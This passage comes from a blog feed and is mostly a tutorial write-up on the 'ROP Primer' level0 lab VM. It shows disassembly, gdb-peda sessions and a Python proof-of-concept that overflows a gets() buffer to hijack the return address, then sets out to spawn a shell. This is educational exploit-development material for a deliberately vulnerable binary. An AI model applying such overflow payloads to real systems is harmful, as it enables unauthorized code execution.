<p>There&rsquo;s the flag: <code>flag{_this_1s_s0_simple_you_should_have_solved__it_1n_5_sec}</code>. Took me a bit longer than 5 seconds&hellip;</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[ROP Primer - Level0]]></title>
    <link href="http://barrebas.github.io/blog/2015/06/28/rop-primer-level0/"/>
    <updated>2015-06-28T19:45:38+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/06/28/rop-primer-level0</id>
    <content type="html"><![CDATA[<p>The ROP VM which I made for this exercise can be downloaded from <a href="https://www.vulnhub.com/entry/rop-primer-02,114/">vulnhub.com</a>. Version 0.2 is fixed, as the home dirs had improper permissions (thanks to faleur and marky for notifying me). We&rsquo;re up against the binary <code>level0</code>. In this case, we have the source code, which helps tremendously. Nevertheless, start by treating it as a blackbox.</p>

<!--more-->


<p>First, enable coredumps.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>seb@minol:~/tmp<span class="nv">$ </span><span class="nb">ulimit</span> -c unlimited
</span></code></pre></td></tr></table></div></figure>


<p>Then, make sure you&rsquo;re not running the exploits against a SUID binary. Linux, by default, will <em>not</em> generate coredumps for SUID binaries. Fair enough. Thanks to @Swappage for alerting me during the workshop!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>seb@minol:~/tmp<span class="nv">$ </span><span class="c"># remember, coredumps don&#39;t work on suid binaries</span>
</span><span class='line'>seb@minol:~/tmp<span class="nv">$ </span><span class="c"># so cp ./level0 (suid level1) to ./level0b</span>
</span></code></pre></td></tr></table></div></figure>


<p>Finally, disassemble the binary with <code>objdump</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>seb@minol:~/tmp<span class="nv">$ </span>objdump -d -M intel ./level0 &gt; level0.out
</span><span class='line'>seb@minol:~/tmp<span class="nv">$ </span><span class="c"># -M intel will use the Intel syntax instead of AT&amp;T&#39;s syntax.</span>
</span></code></pre></td></tr></table></div></figure>


<p>In some cases, the binary is the only thing given, with no source code available. The disassembly will help to get an understanding of what the binary is doing.</p>

<p>Another useful command is <code>file</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>seb@minol:~/tmp<span class="nv">$ </span>file ./level0
</span><span class='line'>./level0: ELF 32-bit LSB executable, Intel 80386, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, statically linked, <span class="k">for</span> GNU/Linux 2.6.26, BuildID<span class="o">[</span>sha1<span class="o">]=</span>0x52c391fb68f9d0b47e49220dfe408334f8fdd088, not stripped
</span></code></pre></td></tr></table></div></figure>


<p>This tells us that the binary is 32 bit and statically linked, which explains its large size.</p>

<p>Let&rsquo;s have a look at the disassembly of <code>main()</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="m">08048254</span> &lt;main&gt;:
</span><span class='line'> 8048254:       <span class="m">55</span>                      push   ebp
</span><span class='line'> 8048255:       <span class="m">89</span> e5                   mov    ebp,esp
</span><span class='line'> 8048257:       <span class="m">83</span> e4 f0                and    esp,0xfffffff0
</span><span class='line'> 804825a:       <span class="m">83</span> ec <span class="m">30</span>                sub    esp,0x30
</span><span class='line'> 804825d:       c7 <span class="m">04</span> <span class="m">24</span> <span class="m">68</span> b6 0a <span class="m">08</span>    mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x80ab668
</span><span class='line'> 8048264:       e8 d7 0c <span class="m">00</span> <span class="m">00</span>          call   8048f40 &lt;_IO_puts&gt;
</span><span class='line'> 8048269:       c7 <span class="m">04</span> <span class="m">24</span> <span class="m">80</span> b6 0a <span class="m">08</span>    mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x80ab680
</span><span class='line'> 8048270:       e8 0b 0b <span class="m">00</span> <span class="m">00</span>          call   8048d80 &lt;_IO_printf&gt;
</span><span class='line'> 8048275:       8d <span class="m">44</span> <span class="m">24</span> <span class="m">10</span>             lea    eax,<span class="o">[</span>esp+0x10<span class="o">]</span>
</span><span class='line'> 8048279:       <span class="m">89</span> <span class="m">04</span> <span class="m">24</span>                mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
</span><span class='line'> 804827c:       e8 2f 0b <span class="m">00</span> <span class="m">00</span>          call   8048db0 &lt;_IO_gets&gt;
</span><span class='line'> 8048281:       8d <span class="m">44</span> <span class="m">24</span> <span class="m">10</span>             lea    eax,<span class="o">[</span>esp+0x10<span class="o">]</span>
</span><span class='line'> 8048285:       <span class="m">89</span> <span class="m">44</span> <span class="m">24</span> <span class="m">04</span>             mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,eax
</span><span class='line'> 8048289:       c7 <span class="m">04</span> <span class="m">24</span> <span class="m">98</span> b6 0a <span class="m">08</span>    mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x80ab698
</span><span class='line'> 8048290:       e8 eb 0a <span class="m">00</span> <span class="m">00</span>          call   8048d80 &lt;_IO_printf&gt;
</span><span class='line'> 8048295:       b8 <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>          mov    eax,0x0
</span><span class='line'> 804829a:       c9                      leave
</span><span class='line'> 804829b:       c3                      ret
</span></code></pre></td></tr></table></div></figure>


<p>We have a classic buffer overflow situation here:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'> 8048275:       8d <span class="m">44</span> <span class="m">24</span> <span class="m">10</span>             lea    eax,<span class="o">[</span>esp+0x10<span class="o">]</span>
</span><span class='line'> 8048279:       <span class="m">89</span> <span class="m">04</span> <span class="m">24</span>                mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
</span><span class='line'> 804827c:       e8 2f 0b <span class="m">00</span> <span class="m">00</span>          call   8048db0 &lt;_IO_gets&gt;
</span></code></pre></td></tr></table></div></figure>


<p>The <code>lea</code> command will load a stack address into <code>eax</code>. That address is put on the stack as an argument for <code>_IO_gets</code>, which will happily read more than enough bytes from STDIN to overflow the buffer and overwrite the saved return address on the stack.</p>

<p>Let&rsquo;s switch to <code>gdb-peda</code> and see the binary in action.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>seb@minol:~/tmp<span class="nv">$ </span><span class="c"># gdb -q is quiet startup, so it won&#39;t print out lots of info. Not strictly necessary. </span>
</span><span class='line'>seb@minol:~/tmp<span class="nv">$ </span>gdb ./level0 -q
</span><span class='line'>Reading symbols from /home/seb/tmp/level0...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
</span><span class='line'>gdb-peda<span class="nv">$ </span>checksec
</span><span class='line'>CANARY    : disabled
</span><span class='line'>FORTIFY   : disabled
</span><span class='line'>NX        : ENABLED
</span><span class='line'>PIE       : disabled
</span><span class='line'>RELRO     : disabled
</span></code></pre></td></tr></table></div></figure>


<p><code>checksec</code> is a very useful command available in <code>gdb-peda</code> (not in vanilla <code>gdb</code>). In this case, one can see that only NX is enabled, meaning that the stack, heap and other data sections are not executable, whereas code sections are executable but not writeable. Let&rsquo;s check this within <code>gdb</code>. First, enter <code>start</code> to run the binary and break at the <code>main()</code> function automatically. Then, inspect the memory layout with <code>vmmap</code>, which will show memory regions that are active in memory along with their memory protection flags.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>start
</span><span class='line'><span class="o">[</span>----------------------------------registers-----------------------------------<span class="o">]</span>
</span><span class='line'>EAX: 0xbffff6bc --&gt; 0xbffff7ff <span class="o">(</span><span class="s2">&quot;ORBIT_SOCKETDIR=/tmp/orbit-seb&quot;</span><span class="o">)</span>
</span><span class='line'>EBX: 0x0
</span><span class='line'>ECX: 0x1
</span><span class='line'>EDX: 0xbffff6b4 --&gt; 0xbffff7ea <span class="o">(</span><span class="s2">&quot;/home/seb/tmp/level0&quot;</span><span class="o">)</span>
</span><span class='line'>ESI: 0x80488e0 <span class="o">(</span>&lt;__libc_csu_fini&gt;:   push   ebp<span class="o">)</span>
</span><span class='line'>EDI: 0x193a5dce
</span><span class='line'>EBP: 0xbffff618 --&gt; 0xbffff688 --&gt; 0x0
</span><span class='line'>ESP: 0xbffff618 --&gt; 0xbffff688 --&gt; 0x0
</span><span class='line'>EIP: 0x8048257 <span class="o">(</span>&lt;main+3&gt;:    and    esp,0xfffffff0<span class="o">)</span>
</span><span class='line'>EFLAGS: 0x246 <span class="o">(</span>carry PARITY adjust ZERO sign <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
</span><span class='line'><span class="o">[</span>-------------------------------------code-------------------------------------<span class="o">]</span>
</span><span class='line'>   0x804824f &lt;frame_dummy+63&gt;:  jmp    0x80481a0 &lt;register_tm_clones&gt;
</span><span class='line'>   0x8048254 &lt;main&gt;:    push   ebp
</span><span class='line'>   0x8048255 &lt;main+1&gt;:  mov    ebp,esp
</span><span class='line'><span class="o">=</span>&gt; 0x8048257 &lt;main+3&gt;:    and    esp,0xfffffff0
</span><span class='line'>   0x804825a &lt;main+6&gt;:  sub    esp,0x30
</span><span class='line'>   0x804825d &lt;main+9&gt;:  mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x80ab668
</span><span class='line'>   0x8048264 &lt;main+16&gt;: call   0x8048f40 &lt;puts&gt;
</span><span class='line'>   0x8048269 &lt;main+21&gt;: mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x80ab680
</span><span class='line'><span class="o">[</span>------------------------------------stack-------------------------------------<span class="o">]</span>
</span><span class='line'>0000<span class="p">|</span> 0xbffff618 --&gt; 0xbffff688 --&gt; 0x0
</span><span class='line'>0004<span class="p">|</span> 0xbffff61c --&gt; 0x8048445 <span class="o">(</span>&lt;__libc_start_main+421&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax<span class="o">)</span>
</span><span class='line'>0008<span class="p">|</span> 0xbffff620 --&gt; 0x1
</span><span class='line'>0012<span class="p">|</span> 0xbffff624 --&gt; 0xbffff6b4 --&gt; 0xbffff7ea <span class="o">(</span><span class="s2">&quot;/home/seb/tmp/level0&quot;</span><span class="o">)</span>
</span><span class='line'>0016<span class="p">|</span> 0xbffff628 --&gt; 0xbffff6bc --&gt; 0xbffff7ff <span class="o">(</span><span class="s2">&quot;ORBIT_SOCKETDIR=/tmp/orbit-seb&quot;</span><span class="o">)</span>
</span><span class='line'>0020<span class="p">|</span> 0xbffff62c --&gt; 0x0
</span><span class='line'>0024<span class="p">|</span> 0xbffff630 --&gt; 0x0
</span><span class='line'>0028<span class="p">|</span> 0xbffff634 --&gt; 0x0
</span><span class='line'><span class="o">[</span>------------------------------------------------------------------------------<span class="o">]</span>
</span><span class='line'>Legend: code, data, rodata, value
</span><span class='line'>
</span><span class='line'>Temporary breakpoint 1, 0x08048257 in main <span class="o">()</span>
</span><span class='line'>gdb-peda<span class="nv">$ </span>vmmap
</span><span class='line'>Start      End        Perm    Name
</span><span class='line'>0x08048000 0x080ca000 r-xp    /home/seb/tmp/level0
</span><span class='line'>0x080ca000 0x080cb000 rw-p    /home/seb/tmp/level0
</span><span class='line'>0x080cb000 0x080ef000 rw-p    <span class="o">[</span>heap<span class="o">]</span>
</span><span class='line'>0xb7fff000 0xb8000000 r-xp    <span class="o">[</span>vdso<span class="o">]</span>
</span><span class='line'>0xbffdf000 0xc0000000 rw-p    <span class="o">[</span>stack<span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>The output of <code>vmmap</code> clearly shows NX in effect: the stack is marked writeable but not executable; the binary, loaded at 0x8048000, is marked executable but not writeable.</p>

<p>So far, so good. Let&rsquo;s continue to run the binary with <code>c</code> and try to overwrite the saved return address on the stack, taking advantage of the <code>_IO_gets</code> call. Note: you can use a patterned buffer for this as well, check out <code>pattern_create</code> and <code>pattern_offset</code> in gdb-peda.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>c
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> ROP tutorial level0
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> What<span class="s1">&#39;s your name? AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLL</span>
</span><span class='line'><span class="s1">[+] Bet you can&#39;</span>t ROP me, AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLL!
</span><span class='line'>
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'><span class="o">[</span>----------------------------------registers-----------------------------------<span class="o">]</span>
</span><span class='line'>EAX: 0x0
</span><span class='line'>EBX: 0x0
</span><span class='line'>ECX: 0xbffff5cc --&gt; 0x80ca720 --&gt; 0xfbad2a84
</span><span class='line'>EDX: 0x80cb690 --&gt; 0x0
</span><span class='line'>ESI: 0x80488e0 <span class="o">(</span>&lt;__libc_csu_fini&gt;:   push   ebp<span class="o">)</span>
</span><span class='line'>EDI: 0x687af80d
</span><span class='line'>EBP: 0x4b4b4b4b <span class="o">(</span><span class="s1">&#39;KKKK&#39;</span><span class="o">)</span>
</span><span class='line'>ESP: 0xbffff620 --&gt; 0x0
</span><span class='line'>EIP: 0x4c4c4c4c <span class="o">(</span><span class="s1">&#39;LLLL&#39;</span><span class="o">)</span>
</span><span class='line'>EFLAGS: 0x10246 <span class="o">(</span>carry PARITY adjust ZERO sign <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
</span><span class='line'><span class="o">[</span>-------------------------------------code-------------------------------------<span class="o">]</span>
</span><span class='line'>Invalid <span class="nv">$PC</span> address: 0x4c4c4c4c
</span><span class='line'><span class="o">[</span>------------------------------------stack-------------------------------------<span class="o">]</span>
</span><span class='line'>0000<span class="p">|</span> 0xbffff620 --&gt; 0x0
</span><span class='line'>0004<span class="p">|</span> 0xbffff624 --&gt; 0xbffff6b4 --&gt; 0xbffff7ea <span class="o">(</span><span class="s2">&quot;/home/seb/tmp/level0&quot;</span><span class="o">)</span>
</span><span class='line'>0008<span class="p">|</span> 0xbffff628 --&gt; 0xbffff6bc --&gt; 0xbffff7ff <span class="o">(</span><span class="s2">&quot;ORBIT_SOCKETDIR=/tmp/orbit-seb&quot;</span><span class="o">)</span>
</span><span class='line'>0012<span class="p">|</span> 0xbffff62c --&gt; 0x0
</span><span class='line'>0016<span class="p">|</span> 0xbffff630 --&gt; 0x0
</span><span class='line'>0020<span class="p">|</span> 0xbffff634 --&gt; 0x0
</span><span class='line'>0024<span class="p">|</span> 0xbffff638 --&gt; 0x0
</span><span class='line'>0028<span class="p">|</span> 0xbffff63c --&gt; 0x0
</span><span class='line'><span class="o">[</span>------------------------------------------------------------------------------<span class="o">]</span>
</span><span class='line'>Legend: code, data, rodata, value
</span><span class='line'>Stopped reason: SIGSEGV
</span><span class='line'>0x4c4c4c4c in ?? <span class="o">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>Lucky shot. <code>eip</code> loaded with <code>LLLL</code> because we&rsquo;ve overwritten the return address for <code>main()</code> on the stack. As soon as the <code>ret</code> at the end of <code>main()</code> was executed, it popped the value off of the top of the stack into <code>eip</code> and increased <code>esp</code> with four. Because we&rsquo;ve overwritten that value, we now control <code>eip</code>. To have a look at the stack, issue the following command:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>x/20wx <span class="nv">$esp</span>-48
</span><span class='line'>0xbffff5f0:   0x41414141  0x42424242  0x43434343  0x44444444
</span><span class='line'>0xbffff600:   0x45454545  0x46464646  0x47474747  0x48484848
</span><span class='line'>0xbffff610:   0x49494949  0x4a4a4a4a  0x4b4b4b4b  0x4c4c4c4c
</span><span class='line'>0xbffff620:   0x00000000  0xbffff6b4  0xbffff6bc  0x00000000
</span><span class='line'>0xbffff630:   0x00000000  0x00000000  0x00000000  0x00000000
</span></code></pre></td></tr></table></div></figure>


<p><code>x</code> stands for inspect, with the format specifier and amount after the slash (in this case, 20 DWORDS). Finally, give it the address from which you want to inspect. In this case, I chose <code>$esp-48</code>, which is the start of the buffer on the stack. Confirm that this is our input.</p>

<p>So let&rsquo;s use this first bit of information and write a script to reliably overwrite the saved return address on the stack. This will serve as the skeleton for our exploit.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'>
</span><span class='line'><span class="c"># this is a helper function, which will take a 32-bit value and convert it to little-endian.</span>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'><span class="c"># start our payload as a string of character.</span>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="c"># add padding to overwrite upto the saved return address.</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="c"># this part should overwrite the saved return address on the stack.</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># make sure to output the rop chain.</span>
</span><span class='line'><span class="k">print</span> <span class="n">payload</span>
</span></code></pre></td></tr></table></div></figure>


<p>To verify that this will return to <code>0xdeadbeef</code> by overwriting the saved return address, we have two options:</p>

<ol>
<li>run it outside of gdb and inspect the coredump that is generated</li>
<li>run it, store the rop chain in a file and run the binary in gdb with the file as input</li>
</ol>


<h2>Method 1</h2>

<p>Running the exploit in this way is the most accurate way, at least as far as memory layout and stack addresses are concerned. There might be a discrepancy between memory addresses when running within <code>gdb</code> vs outside of <code>gdb</code>. There is a way to fix this, using <a href="">fixenv</a>: I did not know of this solution until BSides!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>seb@minol:~/tmp<span class="nv">$ </span>python poc.py <span class="p">|</span> ./level0
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> ROP tutorial level0
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> What<span class="s1">&#39;s your name? [+] Bet you can&#39;</span>t ROP me, AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKﾭ�!
</span><span class='line'>Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
</span><span class='line'>seb@minol:~/tmp<span class="nv">$ </span>gdb -q ./level0 core
</span><span class='line'>Reading symbols from /home/seb/tmp/level0...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
</span><span class='line'><span class="o">[</span>New LWP 2922<span class="o">]</span>
</span><span class='line'>Core was generated by <span class="sb">`</span>./level0<span class="err">&#39;</span>.
</span><span class='line'>Program terminated with signal 11, Segmentation fault.
</span><span class='line'><span class="c">#0  0xdeadbeef in ?? ()</span>
</span><span class='line'>gdb-peda<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<h2>Method 2</h2>

<p>This method is especially useful if you need to inspect the memory with <code>vmmap</code>: <code>gdb</code> cannot display memory layout of a coredump!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>seb@minol:~/tmp<span class="nv">$ </span>python poc.py &gt; input_for_bin
</span><span class='line'>seb@minol:~/tmp<span class="nv">$ </span>gdb -q ./level0
</span><span class='line'>Reading symbols from /home/seb/tmp/level0...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
</span><span class='line'>gdb-peda<span class="nv">$ </span>r &lt; input_for_bin
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> ROP tutorial level0
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> What<span class="s1">&#39;s your name? [+] Bet you can&#39;</span>t ROP me, AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKﾭ�!
</span><span class='line'>
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'><span class="o">[</span>----------------------------------registers-----------------------------------<span class="o">]</span>
</span><span class='line'>EAX: 0x0
</span><span class='line'>EBX: 0x0
</span><span class='line'>ECX: 0xbffff5cc --&gt; 0x80ca720 --&gt; 0xfbad2a84
</span><span class='line'>EDX: 0x80cb690 --&gt; 0x0
</span><span class='line'>ESI: 0x80488e0 <span class="o">(</span>&lt;__libc_csu_fini&gt;:   push   ebp<span class="o">)</span>
</span><span class='line'>EDI: 0x88c01b86
</span><span class='line'>EBP: 0x4b4b4b4b <span class="o">(</span><span class="s1">&#39;KKKK&#39;</span><span class="o">)</span>
</span><span class='line'>ESP: 0xbffff620 --&gt; 0x0
</span><span class='line'>EIP: 0xdeadbeef
</span><span class='line'>EFLAGS: 0x210246 <span class="o">(</span>carry PARITY adjust ZERO sign <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
</span><span class='line'><span class="o">[</span>-------------------------------------code-------------------------------------<span class="o">]</span>
</span><span class='line'>Invalid <span class="nv">$PC</span> address: 0xdeadbeef
</span><span class='line'><span class="o">[</span>------------------------------------stack-------------------------------------<span class="o">]</span>
</span><span class='line'>0000<span class="p">|</span> 0xbffff620 --&gt; 0x0
</span><span class='line'>0004<span class="p">|</span> 0xbffff624 --&gt; 0xbffff6b4 --&gt; 0xbffff7e9 <span class="o">(</span><span class="s2">&quot;/home/seb/tmp/level0&quot;</span><span class="o">)</span>
</span><span class='line'>0008<span class="p">|</span> 0xbffff628 --&gt; 0xbffff6bc --&gt; 0xbffff7fe <span class="o">(</span><span class="s2">&quot;ORBIT_SOCKETDIR=/tmp/orbit-seb&quot;</span><span class="o">)</span>
</span><span class='line'>0012<span class="p">|</span> 0xbffff62c --&gt; 0x0
</span><span class='line'>0016<span class="p">|</span> 0xbffff630 --&gt; 0x0
</span><span class='line'>0020<span class="p">|</span> 0xbffff634 --&gt; 0x0
</span><span class='line'>0024<span class="p">|</span> 0xbffff638 --&gt; 0x0
</span><span class='line'>0028<span class="p">|</span> 0xbffff63c --&gt; 0x0
</span><span class='line'><span class="o">[</span>------------------------------------------------------------------------------<span class="o">]</span>
</span><span class='line'>Legend: code, data, rodata, value
</span><span class='line'>Stopped reason: SIGSEGV
</span><span class='line'>0xdeadbeef in ?? <span class="o">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>Regardless of which method is used, <code>eip</code> now points at <code>0xdeadbeef</code>, which confirms that our proof-of-concept exploit works as intended. We can now start extending the ROP chain to start doing useful things.</p>

<p>In the workshop, I showed the mprotect/read/ret to shellcode strategy. In this writeup, I will use a different way to spawn a shell. We will need access to <code>execve</code> or <code>system()</code> for this.</p>

<p>A lot of students of the ROP workshop tried to find <code>system()</code>, fruitlessly:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>p system
</span><span class='line'>No symbol table is loaded.  Use the <span class="s2">&quot;file&quot;</span> command.
</span></code></pre></td></tr></table></div></figure>


